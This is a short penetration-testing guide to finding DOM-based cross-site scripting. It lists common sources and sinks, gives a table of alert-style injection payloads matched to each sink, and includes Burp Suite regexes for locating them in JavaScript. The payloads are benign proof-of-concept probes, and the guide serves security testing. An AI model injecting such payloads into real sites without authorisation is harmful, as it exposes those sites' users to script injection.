
# DOM XSS Testing Methodology

This methodology helps identify DOM-based Cross-Site Scripting (XSS) vulnerabilities by understanding how user-controlled data (sources) flow into dangerous functions (sinks).

## Common Sources (User-controlled Data)
```js
- document.URL
- document.documentURI
- document.URLUnencoded
- document.baseURI
- location.search
- location.hash
- location.href
- location.pathname
- location.origin
- location.port
- location.protocol
- location.hostname
- document.referrer
- document.cookie
```

## Common Sinks (Sensitive Functions)
```js
- document.write()
- document.writeln()
- document.domain
- element.innerHTML
- element.outerHTML
- element.insertAdjacentHTML()
- element.setAttribute()
- eval()
- setTimeout()
- setInterval()
- Function()
- window.location
- window.location.assign()
- window.location.replace()
- window.open()
```

## Payload Examples Per Sink

| Sink                   | Example Payload                             |
|------------------------|---------------------------------------------|
| document.write()       | `<img src=x onerror=alert(1)>`              |
| innerHTML              | `<svg/onload=alert(1)>`                     |
| outerHTML              | `<body onload=alert(1)>`                    |
| insertAdjacentHTML     | `<iframe src=javascript:alert(1)>`         |
| setAttribute           | `onerror=alert(1)`                          |
| eval / Function        | `alert(1)` or `confirm(document.domain)`   |
| setTimeout             | `setTimeout("alert(1)", 1000)`              |
| window.location        | `window.location='javascript:alert(1)'`     |

## Regex for Searching Sources in Burp Suite
```
(document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\.(search|hash|href|pathname|origin|port|protocol|hostname))
```

## Regex for Searching Sinks in Burp Suite
```
(document\.write(ln)?\(|(element\.)?(innerHTML|outerHTML|insertAdjacentHTML|setAttribute)\(|eval\(|Function\(|set(Time|Interval)\(|window\.location(\.assign|\.replace|\.href)?|window\.open\()
```

---

**Note:** Always test with multiple payloads and contexts. DOM XSS can occur even without obvious reflection if JS logic manipulates the DOM dynamically.
